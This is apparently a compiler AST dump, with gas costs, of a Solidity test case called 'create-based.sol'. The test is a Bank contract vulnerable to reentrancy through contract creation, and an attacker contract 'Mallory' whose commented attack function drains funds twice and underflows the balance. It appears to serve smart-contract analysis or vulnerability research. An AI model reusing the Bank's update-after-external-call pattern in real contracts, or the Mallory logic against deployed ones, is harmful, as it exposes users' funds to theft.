@@ -1,0 +1,731 @@
+Syntax trees:
+
+
+======= create-based.sol =======
+PragmaDirective
+   Gas costs: 0
+   Source: "pragma solidity ^0.4.21;"
+ContractDefinition "IntermediaryCallback"
+   Gas costs: 0
+   Source: "contract IntermediaryCallback {\r\n    /*function registerIntermediary(address payable what) public payable;*/\r\n    // for solidity 0.4.21\r\n    function registerIntermediary(address what) public payable;\r\n}"
+  FunctionDefinition "registerIntermediary" - public
+     Source: "function registerIntermediary(address what) public payable;"
+    ParameterList
+       Source: "(address what)"
+      VariableDeclaration "what"
+         Type: address
+         Source: "address what"
+        ElementaryTypeName address
+           Source: "address"
+    ParameterList
+       Source: ""
+ContractDefinition "Intermediary"
+   Source: "contract Intermediary {\r\n    // this contract just holds the funds until the owner comes along and\r\n    // withdraws them.\r\n\r\n    address owner;\r\n    Bank bank;\r\n    uint amount;\r\n\r\n   // constructor(Bank _bank, address _owner, uint _amount) public {\r\n    // for solidity 0.4.21\r\n    function Intermediary(Bank _bank, address _owner, uint _amount) public {\r\n        owner = _owner;\r\n        bank = _bank;\r\n        amount = _amount;\r\n\r\n        // this contract wants to register itself with its new owner, so it\r\n        // calls the new owner (i.e. the attacker). This passes control to an\r\n        // untrusted third-party contract.\r\n        IntermediaryCallback(_owner).registerIntermediary(address(this));\r\n    }\r\n\r\n    function withdraw() public {\r\n        if (msg.sender == owner) {\r\n            msg.sender.transfer(amount);\r\n        }\r\n    }\r\n    \r\n    function () payable external {}\r\n}"
+  VariableDeclaration "owner"
+     Type: address
+     Gas costs: 0
+     Source: "address owner"
+    ElementaryTypeName address
+       Source: "address"
+  VariableDeclaration "bank"
+     Type: contract Bank
+     Gas costs: 0
+     Source: "Bank bank"
+    UserDefinedTypeName "Bank"
+       Source: "Bank"
+  VariableDeclaration "amount"
+     Type: uint256
+     Gas costs: 0
+     Source: "uint amount"
+    ElementaryTypeName uint
+       Source: "uint"
+  FunctionDefinition "Intermediary" - public
+     Source: "function Intermediary(Bank _bank, address _owner, uint _amount) public {\r\n        owner = _owner;\r\n        bank = _bank;\r\n        amount = _amount;\r\n\r\n        // this contract wants to register itself with its new owner, so it\r\n        // calls the new owner (i.e. the attacker). This passes control to an\r\n        // untrusted third-party contract.\r\n        IntermediaryCallback(_owner).registerIntermediary(address(this));\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(Bank _bank, address _owner, uint _amount)"
+      VariableDeclaration "_bank"
+         Type: contract Bank
+         Source: "Bank _bank"
+        UserDefinedTypeName "Bank"
+           Source: "Bank"
+      VariableDeclaration "_owner"
+         Type: address
+         Source: "address _owner"
+        ElementaryTypeName address
+           Source: "address"
+      VariableDeclaration "_amount"
+         Type: uint256
+         Source: "uint _amount"
+        ElementaryTypeName uint
+           Source: "uint"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        owner = _owner;\r\n        bank = _bank;\r\n        amount = _amount;\r\n\r\n        // this contract wants to register itself with its new owner, so it\r\n        // calls the new owner (i.e. the attacker). This passes control to an\r\n        // untrusted third-party contract.\r\n        IntermediaryCallback(_owner).registerIntermediary(address(this));\r\n    }"
+      ExpressionStatement
+         Gas costs: 0
+         Source: "owner = _owner"
+        Assignment using operator =
+           Type: address
+           Source: "owner = _owner"
+          Identifier owner
+             Type: address
+             Source: "owner"
+          Identifier _owner
+             Type: address
+             Source: "_owner"
+      ExpressionStatement
+         Gas costs: 0
+         Source: "bank = _bank"
+        Assignment using operator =
+           Type: contract Bank
+           Source: "bank = _bank"
+          Identifier bank
+             Type: contract Bank
+             Source: "bank"
+          Identifier _bank
+             Type: contract Bank
+             Source: "_bank"
+      ExpressionStatement
+         Gas costs: 0
+         Source: "amount = _amount"
+        Assignment using operator =
+           Type: uint256
+           Source: "amount = _amount"
+          Identifier amount
+             Type: uint256
+             Source: "amount"
+          Identifier _amount
+             Type: uint256
+             Source: "_amount"
+      ExpressionStatement
+         Gas costs: 0
+         Source: "IntermediaryCallback(_owner).registerIntermediary(address(this))"
+        FunctionCall
+           Type: tuple()
+           Source: "IntermediaryCallback(_owner).registerIntermediary(address(this))"
+          MemberAccess to member registerIntermediary
+             Type: function (address) payable external
+             Source: "IntermediaryCallback(_owner).registerIntermediary"
+            FunctionCall
+               Type: contract IntermediaryCallback
+               Source: "IntermediaryCallback(_owner)"
+              Identifier IntermediaryCallback
+                 Type: type(contract IntermediaryCallback)
+                 Source: "IntermediaryCallback"
+              Identifier _owner
+                 Type: address
+                 Source: "_owner"
+          FunctionCall
+             Type: address
+             Source: "address(this)"
+            ElementaryTypeNameExpression address
+               Type: type(address)
+               Source: "address"
+            Identifier this
+               Type: contract Intermediary
+               Source: "this"
+  FunctionDefinition "withdraw" - public
+     Source: "function withdraw() public {\r\n        if (msg.sender == owner) {\r\n            msg.sender.transfer(amount);\r\n        }\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "()"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        if (msg.sender == owner) {\r\n            msg.sender.transfer(amount);\r\n        }\r\n    }"
+      IfStatement
+         Source: "if (msg.sender == owner) {\r\n            msg.sender.transfer(amount);\r\n        }"
+        BinaryOperation using operator ==
+           Type: bool
+           Gas costs: 0
+           Source: "msg.sender == owner"
+          MemberAccess to member sender
+             Type: address
+             Source: "msg.sender"
+            Identifier msg
+               Type: msg
+               Source: "msg"
+          Identifier owner
+             Type: address
+             Source: "owner"
+        Block
+           Source: "{\r\n            msg.sender.transfer(amount);\r\n        }"
+          ExpressionStatement
+             Gas costs: 0
+             Source: "msg.sender.transfer(amount)"
+            FunctionCall
+               Type: tuple()
+               Source: "msg.sender.transfer(amount)"
+              MemberAccess to member transfer
+                 Type: function (uint256)
+                 Source: "msg.sender.transfer"
+                MemberAccess to member sender
+                   Type: address
+                   Source: "msg.sender"
+                  Identifier msg
+                     Type: msg
+                     Source: "msg"
+              Identifier amount
+                 Type: uint256
+                 Source: "amount"
+  FunctionDefinition "" - public
+     Source: "function () payable external {}"
+    ParameterList
+       Gas costs: 0
+       Source: "()"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Gas costs: 0
+       Source: "{}"
+ContractDefinition "Bank"
+   Source: "contract Bank {\r\n    mapping (address => uint) balances;\r\n    mapping (address => Intermediary) subs;\r\n\r\n    function getBalance(address a) public view returns(uint) {\r\n        return balances[a];\r\n    }\r\n\r\n    function withdraw(uint amount) public {\r\n        if (balances[msg.sender] >= amount) {\r\n            // The new keyword creates a new contract (in this case of type\r\n            // Intermediary). This is implemented on the EVM level with the CREATE\r\n            // instruction. CREATE immediately runs the constructor of the\r\n            // contract. i.e this must be seen as an external call to another\r\n            // contract.\r\n            // Even though the contract can be considered \"trusted\", it can\r\n            // perform further problematic actions (e.g. more external calls)\r\n            subs[msg.sender] = new Intermediary(this, msg.sender, amount);\r\n            // state update **after** the CREATE\r\n            balances[msg.sender] -= amount;\r\n            address(subs[msg.sender]).transfer(amount);\r\n        }\r\n    }\r\n    \r\n    function deposit() public payable {\r\n        balances[msg.sender] += msg.value;\r\n    }\r\n}"
+  VariableDeclaration "balances"
+     Type: mapping(address => uint256)
+     Gas costs: 0
+     Source: "mapping (address => uint) balances"
+    Mapping
+       Source: "mapping (address => uint)"
+      ElementaryTypeName address
+         Source: "address"
+      ElementaryTypeName uint
+         Source: "uint"
+  VariableDeclaration "subs"
+     Type: mapping(address => contract Intermediary)
+     Gas costs: 0
+     Source: "mapping (address => Intermediary) subs"
+    Mapping
+       Source: "mapping (address => Intermediary)"
+      ElementaryTypeName address
+         Source: "address"
+      UserDefinedTypeName "Intermediary"
+         Source: "Intermediary"
+  FunctionDefinition "getBalance" - public - const
+     Source: "function getBalance(address a) public view returns(uint) {\r\n        return balances[a];\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(address a)"
+      VariableDeclaration "a"
+         Type: address
+         Source: "address a"
+        ElementaryTypeName address
+           Source: "address"
+    ParameterList
+       Gas costs: 0
+       Source: "(uint)"
+      VariableDeclaration ""
+         Type: uint256
+         Source: "uint"
+        ElementaryTypeName uint
+           Source: "uint"
+    Block
+       Source: "{\r\n        return balances[a];\r\n    }"
+      Return
+         Gas costs: 0
+         Source: "return balances[a]"
+        IndexAccess
+           Type: uint256
+           Source: "balances[a]"
+          Identifier balances
+             Type: mapping(address => uint256)
+             Source: "balances"
+          Identifier a
+             Type: address
+             Source: "a"
+  FunctionDefinition "withdraw" - public
+     Source: "function withdraw(uint amount) public {\r\n        if (balances[msg.sender] >= amount) {\r\n            // The new keyword creates a new contract (in this case of type\r\n            // Intermediary). This is implemented on the EVM level with the CREATE\r\n            // instruction. CREATE immediately runs the constructor of the\r\n            // contract. i.e this must be seen as an external call to another\r\n            // contract.\r\n            // Even though the contract can be considered \"trusted\", it can\r\n            // perform further problematic actions (e.g. more external calls)\r\n            subs[msg.sender] = new Intermediary(this, msg.sender, amount);\r\n            // state update **after** the CREATE\r\n            balances[msg.sender] -= amount;\r\n            address(subs[msg.sender]).transfer(amount);\r\n        }\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(uint amount)"
+      VariableDeclaration "amount"
+         Type: uint256
+         Source: "uint amount"
+        ElementaryTypeName uint
+           Source: "uint"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        if (balances[msg.sender] >= amount) {\r\n            // The new keyword creates a new contract (in this case of type\r\n            // Intermediary). This is implemented on the EVM level with the CREATE\r\n            // instruction. CREATE immediately runs the constructor of the\r\n            // contract. i.e this must be seen as an external call to another\r\n            // contract.\r\n            // Even though the contract can be considered \"trusted\", it can\r\n            // perform further problematic actions (e.g. more external calls)\r\n            subs[msg.sender] = new Intermediary(this, msg.sender, amount);\r\n            // state update **after** the CREATE\r\n            balances[msg.sender] -= amount;\r\n            address(subs[msg.sender]).transfer(amount);\r\n        }\r\n    }"
+      IfStatement
+         Source: "if (balances[msg.sender] >= amount) {\r\n            // The new keyword creates a new contract (in this case of type\r\n            // Intermediary). This is implemented on the EVM level with the CREATE\r\n            // instruction. CREATE immediately runs the constructor of the\r\n            // contract. i.e this must be seen as an external call to another\r\n            // contract.\r\n            // Even though the contract can be considered \"trusted\", it can\r\n            // perform further problematic actions (e.g. more external calls)\r\n            subs[msg.sender] = new Intermediary(this, msg.sender, amount);\r\n            // state update **after** the CREATE\r\n            balances[msg.sender] -= amount;\r\n            address(subs[msg.sender]).transfer(amount);\r\n        }"
+        BinaryOperation using operator >=
+           Type: bool
+           Gas costs: 0
+           Source: "balances[msg.sender] >= amount"
+          IndexAccess
+             Type: uint256
+             Source: "balances[msg.sender]"
+            Identifier balances
+               Type: mapping(address => uint256)
+               Source: "balances"
+            MemberAccess to member sender
+               Type: address
+               Source: "msg.sender"
+              Identifier msg
+                 Type: msg
+                 Source: "msg"
+          Identifier amount
+             Type: uint256
+             Source: "amount"
+        Block
+           Source: "{\r\n            // The new keyword creates a new contract (in this case of type\r\n            // Intermediary). This is implemented on the EVM level with the CREATE\r\n            // instruction. CREATE immediately runs the constructor of the\r\n            // contract. i.e this must be seen as an external call to another\r\n            // contract.\r\n            // Even though the contract can be considered \"trusted\", it can\r\n            // perform further problematic actions (e.g. more external calls)\r\n            subs[msg.sender] = new Intermediary(this, msg.sender, amount);\r\n            // state update **after** the CREATE\r\n            balances[msg.sender] -= amount;\r\n            address(subs[msg.sender]).transfer(amount);\r\n        }"
+          ExpressionStatement
+             Gas costs: 0
+             Source: "subs[msg.sender] = new Intermediary(this, msg.sender, amount)"
+            Assignment using operator =
+               Type: contract Intermediary
+               Source: "subs[msg.sender] = new Intermediary(this, msg.sender, amount)"
+              IndexAccess
+                 Type: contract Intermediary
+                 Source: "subs[msg.sender]"
+                Identifier subs
+                   Type: mapping(address => contract Intermediary)
+                   Source: "subs"
+                MemberAccess to member sender
+                   Type: address
+                   Source: "msg.sender"
+                  Identifier msg
+                     Type: msg
+                     Source: "msg"
+              FunctionCall
+                 Type: contract Intermediary
+                 Source: "new Intermediary(this, msg.sender, amount)"
+                NewExpression
+                   Type: function (contract Bank,address,uint256) returns (contract Intermediary)
+                   Source: "new Intermediary"
+                  UserDefinedTypeName "Intermediary"
+                     Source: "Intermediary"
+                Identifier this
+                   Type: contract Bank
+                   Source: "this"
+                MemberAccess to member sender
+                   Type: address
+                   Source: "msg.sender"
+                  Identifier msg
+                     Type: msg
+                     Source: "msg"
+                Identifier amount
+                   Type: uint256
+                   Source: "amount"
+          ExpressionStatement
+             Gas costs: 0
+             Source: "balances[msg.sender] -= amount"
+            Assignment using operator -=
+               Type: uint256
+               Source: "balances[msg.sender] -= amount"
+              IndexAccess
+                 Type: uint256
+                 Source: "balances[msg.sender]"
+                Identifier balances
+                   Type: mapping(address => uint256)
+                   Source: "balances"
+                MemberAccess to member sender
+                   Type: address
+                   Source: "msg.sender"
+                  Identifier msg
+                     Type: msg
+                     Source: "msg"
+              Identifier amount
+                 Type: uint256
+                 Source: "amount"
+          ExpressionStatement
+             Gas costs: 0
+             Source: "address(subs[msg.sender]).transfer(amount)"
+            FunctionCall
+               Type: tuple()
+               Source: "address(subs[msg.sender]).transfer(amount)"
+              MemberAccess to member transfer
+                 Type: function (uint256)
+                 Source: "address(subs[msg.sender]).transfer"
+                FunctionCall
+                   Type: address
+                   Source: "address(subs[msg.sender])"
+                  ElementaryTypeNameExpression address
+                     Type: type(address)
+                     Source: "address"
+                  IndexAccess
+                     Type: contract Intermediary
+                     Source: "subs[msg.sender]"
+                    Identifier subs
+                       Type: mapping(address => contract Intermediary)
+                       Source: "subs"
+                    MemberAccess to member sender
+                       Type: address
+                       Source: "msg.sender"
+                      Identifier msg
+                         Type: msg
+                         Source: "msg"
+              Identifier amount
+                 Type: uint256
+                 Source: "amount"
+  FunctionDefinition "deposit" - public
+     Source: "function deposit() public payable {\r\n        balances[msg.sender] += msg.value;\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "()"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        balances[msg.sender] += msg.value;\r\n    }"
+      ExpressionStatement
+         Gas costs: 0
+         Source: "balances[msg.sender] += msg.value"
+        Assignment using operator +=
+           Type: uint256
+           Source: "balances[msg.sender] += msg.value"
+          IndexAccess
+             Type: uint256
+             Source: "balances[msg.sender]"
+            Identifier balances
+               Type: mapping(address => uint256)
+               Source: "balances"
+            MemberAccess to member sender
+               Type: address
+               Source: "msg.sender"
+              Identifier msg
+                 Type: msg
+                 Source: "msg"
+          MemberAccess to member value
+             Type: uint256
+             Source: "msg.value"
+            Identifier msg
+               Type: msg
+               Source: "msg"
+ContractDefinition "Mallory"
+   Source: "contract Mallory is IntermediaryCallback {\r\n    Bank bank;\r\n    uint state;\r\n    Intermediary i1;\r\n    Intermediary i2;\r\n\r\n    function attack(Bank b, uint amount) public payable {\r\n        state = 0;\r\n        bank = b;\r\n        // first deposit some ether\r\n        bank.deposit.value(amount)();\r\n        // then withdraw it again. This will create a new Intermediary contract, which\r\n        // holds the funds until we retrieve it. This will trigger the\r\n        // registerIntermediary callback.\r\n        bank.withdraw(bank.getBalance(address(this)));\r\n        // finally withdraw all the funds from our Intermediarys\r\n        i1.withdraw();\r\n        i2.withdraw();\r\n\r\n        // note that bank.balances[this] has underflowed by now, so we will see\r\n        // also a huge balances entry for the Mallory contract.\r\n    }\r\n\r\n    /*function registerIntermediary(address payable what) public payable {*/\r\n    // for solidity 0.4.21\r\n    function registerIntermediary(address what) public payable {\r\n        // called by the newly created Intermediary contracts\r\n        if (state == 0) {\r\n            // we do not want to loop the re-entrancy until we run out of gas,\r\n            // so we stop after the second withdrawal\r\n            state = 1;\r\n            // we keep track of the Intermediary, because it holds our funds\r\n            i1 = Intermediary(what);\r\n            // withdraw again - note that `bank.balances[this]` was not yet\r\n            // updated.\r\n            bank.withdraw(bank.getBalance(address(this)));\r\n        } else if (state == 1) {\r\n            state = 2;\r\n            // this is the second Intermediary that holds funds for us\r\n            i2 = Intermediary(what);\r\n        } else {\r\n            // ignore everything else\r\n        }\r\n    }\r\n\r\n    function withdrawAll() public {\r\n        i1.withdraw();\r\n        i2.withdraw();\r\n    }\r\n    \r\n    function () external payable {}\r\n}"
+  InheritanceSpecifier
+     Gas costs: 0
+     Source: "IntermediaryCallback"
+    UserDefinedTypeName "IntermediaryCallback"
+       Source: "IntermediaryCallback"
+  VariableDeclaration "bank"
+     Type: contract Bank
+     Gas costs: 0
+     Source: "Bank bank"
+    UserDefinedTypeName "Bank"
+       Source: "Bank"
+  VariableDeclaration "state"
+     Type: uint256
+     Gas costs: 0
+     Source: "uint state"
+    ElementaryTypeName uint
+       Source: "uint"
+  VariableDeclaration "i1"
+     Type: contract Intermediary
+     Gas costs: 0
+     Source: "Intermediary i1"
+    UserDefinedTypeName "Intermediary"
+       Source: "Intermediary"
+  VariableDeclaration "i2"
+     Type: contract Intermediary
+     Gas costs: 0
+     Source: "Intermediary i2"
+    UserDefinedTypeName "Intermediary"
+       Source: "Intermediary"
+  FunctionDefinition "attack" - public
+     Source: "function attack(Bank b, uint amount) public payable {\r\n        state = 0;\r\n        bank = b;\r\n        // first deposit some ether\r\n        bank.deposit.value(amount)();\r\n        // then withdraw it again. This will create a new Intermediary contract, which\r\n        // holds the funds until we retrieve it. This will trigger the\r\n        // registerIntermediary callback.\r\n        bank.withdraw(bank.getBalance(address(this)));\r\n        // finally withdraw all the funds from our Intermediarys\r\n        i1.withdraw();\r\n        i2.withdraw();\r\n\r\n        // note that bank.balances[this] has underflowed by now, so we will see\r\n        // also a huge balances entry for the Mallory contract.\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(Bank b, uint amount)"
+      VariableDeclaration "b"
+         Type: contract Bank
+         Source: "Bank b"
+        UserDefinedTypeName "Bank"
+           Source: "Bank"
+      VariableDeclaration "amount"
+         Type: uint256
+         Source: "uint amount"
+        ElementaryTypeName uint
+           Source: "uint"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        state = 0;\r\n        bank = b;\r\n        // first deposit some ether\r\n        bank.deposit.value(amount)();\r\n        // then withdraw it again. This will create a new Intermediary contract, which\r\n        // holds the funds until we retrieve it. This will trigger the\r\n        // registerIntermediary callback.\r\n        bank.withdraw(bank.getBalance(address(this)));\r\n        // finally withdraw all the funds from our Intermediarys\r\n        i1.withdraw();\r\n        i2.withdraw();\r\n\r\n        // note that bank.balances[this] has underflowed by now, so we will see\r\n        // also a huge balances entry for the Mallory contract.\r\n    }"
+      ExpressionStatement
+         Gas costs: 5014
+         Source: "state = 0"
+        Assignment using operator =
+           Type: uint256
+           Source: "state = 0"
+          Identifier state
+             Type: uint256
+             Source: "state"
+          Literal, token: [no token] value: 0
+             Type: int_const 0
+             Source: "0"
+      ExpressionStatement
+         Gas costs: 20267
+         Source: "bank = b"
+        Assignment using operator =
+           Type: contract Bank
+           Source: "bank = b"
+          Identifier bank
+             Type: contract Bank
+             Source: "bank"
+          Identifier b
+             Type: contract Bank
+             Source: "b"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "bank.deposit.value(amount)()"
+        FunctionCall
+           Type: tuple()
+           Source: "bank.deposit.value(amount)()"
+          FunctionCall
+             Type: function () payable external
+             Source: "bank.deposit.value(amount)"
+            MemberAccess to member value
+               Type: function (uint256) returns (function () payable external)
+               Source: "bank.deposit.value"
+              MemberAccess to member deposit
+                 Type: function () payable external
+                 Source: "bank.deposit"
+                Identifier bank
+                   Type: contract Bank
+                   Source: "bank"
+            Identifier amount
+               Type: uint256
+               Source: "amount"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "bank.withdraw(bank.getBalance(address(this)))"
+        FunctionCall
+           Type: tuple()
+           Source: "bank.withdraw(bank.getBalance(address(this)))"
+          MemberAccess to member withdraw
+             Type: function (uint256) external
+             Source: "bank.withdraw"
+            Identifier bank
+               Type: contract Bank
+               Source: "bank"
+          FunctionCall
+             Type: uint256
+             Source: "bank.getBalance(address(this))"
+            MemberAccess to member getBalance
+               Type: function (address) view external returns (uint256)
+               Source: "bank.getBalance"
+              Identifier bank
+                 Type: contract Bank
+                 Source: "bank"
+            FunctionCall
+               Type: address
+               Source: "address(this)"
+              ElementaryTypeNameExpression address
+                 Type: type(address)
+                 Source: "address"
+              Identifier this
+                 Type: contract Mallory
+                 Source: "this"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "i1.withdraw()"
+        FunctionCall
+           Type: tuple()
+           Source: "i1.withdraw()"
+          MemberAccess to member withdraw
+             Type: function () external
+             Source: "i1.withdraw"
+            Identifier i1
+               Type: contract Intermediary
+               Source: "i1"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "i2.withdraw()"
+        FunctionCall
+           Type: tuple()
+           Source: "i2.withdraw()"
+          MemberAccess to member withdraw
+             Type: function () external
+             Source: "i2.withdraw"
+            Identifier i2
+               Type: contract Intermediary
+               Source: "i2"
+  FunctionDefinition "registerIntermediary" - public
+     Source: "function registerIntermediary(address what) public payable {\r\n        // called by the newly created Intermediary contracts\r\n        if (state == 0) {\r\n            // we do not want to loop the re-entrancy until we run out of gas,\r\n            // so we stop after the second withdrawal\r\n            state = 1;\r\n            // we keep track of the Intermediary, because it holds our funds\r\n            i1 = Intermediary(what);\r\n            // withdraw again - note that `bank.balances[this]` was not yet\r\n            // updated.\r\n            bank.withdraw(bank.getBalance(address(this)));\r\n        } else if (state == 1) {\r\n            state = 2;\r\n            // this is the second Intermediary that holds funds for us\r\n            i2 = Intermediary(what);\r\n        } else {\r\n            // ignore everything else\r\n        }\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "(address what)"
+      VariableDeclaration "what"
+         Type: address
+         Source: "address what"
+        ElementaryTypeName address
+           Source: "address"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        // called by the newly created Intermediary contracts\r\n        if (state == 0) {\r\n            // we do not want to loop the re-entrancy until we run out of gas,\r\n            // so we stop after the second withdrawal\r\n            state = 1;\r\n            // we keep track of the Intermediary, because it holds our funds\r\n            i1 = Intermediary(what);\r\n            // withdraw again - note that `bank.balances[this]` was not yet\r\n            // updated.\r\n            bank.withdraw(bank.getBalance(address(this)));\r\n        } else if (state == 1) {\r\n            state = 2;\r\n            // this is the second Intermediary that holds funds for us\r\n            i2 = Intermediary(what);\r\n        } else {\r\n            // ignore everything else\r\n        }\r\n    }"
+      IfStatement
+         Source: "if (state == 0) {\r\n            // we do not want to loop the re-entrancy until we run out of gas,\r\n            // so we stop after the second withdrawal\r\n            state = 1;\r\n            // we keep track of the Intermediary, because it holds our funds\r\n            i1 = Intermediary(what);\r\n            // withdraw again - note that `bank.balances[this]` was not yet\r\n            // updated.\r\n            bank.withdraw(bank.getBalance(address(this)));\r\n        } else if (state == 1) {\r\n            state = 2;\r\n            // this is the second Intermediary that holds funds for us\r\n            i2 = Intermediary(what);\r\n        } else {\r\n            // ignore everything else\r\n        }"
+        BinaryOperation using operator ==
+           Type: bool
+           Gas costs: 209
+           Source: "state == 0"
+          Identifier state
+             Type: uint256
+             Source: "state"
+          Literal, token: [no token] value: 0
+             Type: int_const 0
+             Source: "0"
+        Block
+           Source: "{\r\n            // we do not want to loop the re-entrancy until we run out of gas,\r\n            // so we stop after the second withdrawal\r\n            state = 1;\r\n            // we keep track of the Intermediary, because it holds our funds\r\n            i1 = Intermediary(what);\r\n            // withdraw again - note that `bank.balances[this]` was not yet\r\n            // updated.\r\n            bank.withdraw(bank.getBalance(address(this)));\r\n        }"
+          ExpressionStatement
+             Gas costs: 20014
+             Source: "state = 1"
+            Assignment using operator =
+               Type: uint256
+               Source: "state = 1"
+              Identifier state
+                 Type: uint256
+                 Source: "state"
+              Literal, token: [no token] value: 1
+                 Type: int_const 1
+                 Source: "1"
+          ExpressionStatement
+             Gas costs: 20267
+             Source: "i1 = Intermediary(what)"
+            Assignment using operator =
+               Type: contract Intermediary
+               Source: "i1 = Intermediary(what)"
+              Identifier i1
+                 Type: contract Intermediary
+                 Source: "i1"
+              FunctionCall
+                 Type: contract Intermediary
+                 Source: "Intermediary(what)"
+                Identifier Intermediary
+                   Type: type(contract Intermediary)
+                   Source: "Intermediary"
+                Identifier what
+                   Type: address
+                   Source: "what"
+          ExpressionStatement
+             Gas costs: [???]
+             Source: "bank.withdraw(bank.getBalance(address(this)))"
+            FunctionCall
+               Type: tuple()
+               Source: "bank.withdraw(bank.getBalance(address(this)))"
+              MemberAccess to member withdraw
+                 Type: function (uint256) external
+                 Source: "bank.withdraw"
+                Identifier bank
+                   Type: contract Bank
+                   Source: "bank"
+              FunctionCall
+                 Type: uint256
+                 Source: "bank.getBalance(address(this))"
+                MemberAccess to member getBalance
+                   Type: function (address) view external returns (uint256)
+                   Source: "bank.getBalance"
+                  Identifier bank
+                     Type: contract Bank
+                     Source: "bank"
+                FunctionCall
+                   Type: address
+                   Source: "address(this)"
+                  ElementaryTypeNameExpression address
+                     Type: type(address)
+                     Source: "address"
+                  Identifier this
+                     Type: contract Mallory
+                     Source: "this"
+        IfStatement
+           Source: "if (state == 1) {\r\n            state = 2;\r\n            // this is the second Intermediary that holds funds for us\r\n            i2 = Intermediary(what);\r\n        } else {\r\n            // ignore everything else\r\n        }"
+          BinaryOperation using operator ==
+             Type: bool
+             Gas costs: 209
+             Source: "state == 1"
+            Identifier state
+               Type: uint256
+               Source: "state"
+            Literal, token: [no token] value: 1
+               Type: int_const 1
+               Source: "1"
+          Block
+             Source: "{\r\n            state = 2;\r\n            // this is the second Intermediary that holds funds for us\r\n            i2 = Intermediary(what);\r\n        }"
+            ExpressionStatement
+               Gas costs: 20014
+               Source: "state = 2"
+              Assignment using operator =
+                 Type: uint256
+                 Source: "state = 2"
+                Identifier state
+                   Type: uint256
+                   Source: "state"
+                Literal, token: [no token] value: 2
+                   Type: int_const 2
+                   Source: "2"
+            ExpressionStatement
+               Gas costs: 20267
+               Source: "i2 = Intermediary(what)"
+              Assignment using operator =
+                 Type: contract Intermediary
+                 Source: "i2 = Intermediary(what)"
+                Identifier i2
+                   Type: contract Intermediary
+                   Source: "i2"
+                FunctionCall
+                   Type: contract Intermediary
+                   Source: "Intermediary(what)"
+                  Identifier Intermediary
+                     Type: type(contract Intermediary)
+                     Source: "Intermediary"
+                  Identifier what
+                     Type: address
+                     Source: "what"
+          Block
+             Gas costs: 0
+             Source: "{\r\n            // ignore everything else\r\n        }"
+  FunctionDefinition "withdrawAll" - public
+     Source: "function withdrawAll() public {\r\n        i1.withdraw();\r\n        i2.withdraw();\r\n    }"
+    ParameterList
+       Gas costs: 0
+       Source: "()"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Source: "{\r\n        i1.withdraw();\r\n        i2.withdraw();\r\n    }"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "i1.withdraw()"
+        FunctionCall
+           Type: tuple()
+           Source: "i1.withdraw()"
+          MemberAccess to member withdraw
+             Type: function () external
+             Source: "i1.withdraw"
+            Identifier i1
+               Type: contract Intermediary
+               Source: "i1"
+      ExpressionStatement
+         Gas costs: [???]
+         Source: "i2.withdraw()"
+        FunctionCall
+           Type: tuple()
+           Source: "i2.withdraw()"
+          MemberAccess to member withdraw
+             Type: function () external
+             Source: "i2.withdraw"
+            Identifier i2
+               Type: contract Intermediary
+               Source: "i2"
+  FunctionDefinition "" - public
+     Source: "function () external payable {}"
+    ParameterList
+       Gas costs: 0
+       Source: "()"
+    ParameterList
+       Gas costs: 0
+       Source: ""
+    Block
+       Gas costs: 0
+       Source: "{}"
